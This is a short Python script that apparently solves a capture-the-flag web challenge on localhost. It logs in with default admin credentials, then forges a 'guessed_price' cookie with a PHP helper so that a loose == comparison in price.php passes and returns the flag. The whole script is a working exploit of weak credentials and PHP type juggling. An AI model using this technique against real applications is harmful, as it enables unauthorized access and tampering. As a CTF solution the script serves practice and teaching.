import requests
import subprocess
from pathlib import Path

# Login to get admin session
URL = "http://localhost:5002"

s = requests.Session()

data = {
    "username": "Admin", # case insensitive MySQL
    "password": "admin"
}

s.post(URL, data=data) # Obtain PHPSESSID cookie

# Obtain cookie logic
php_file = Path(__file__).parent / "cookie.php"
proc = subprocess.Popen(f"php {php_file}", shell=True, stdout=subprocess.PIPE)
guessed_price_cookie = proc.stdout.read().decode() # get correct cookie with price value set to boolean `true`

final_cookies = {
    "PHPSESSID": s.cookies['PHPSESSID'],
    "guessed_price": guessed_price_cookie
}

flag = s.get(URL + "/price.php", cookies=final_cookies) # Condition passes due to loose comparison `==` instead of `===`
print(flag.text)
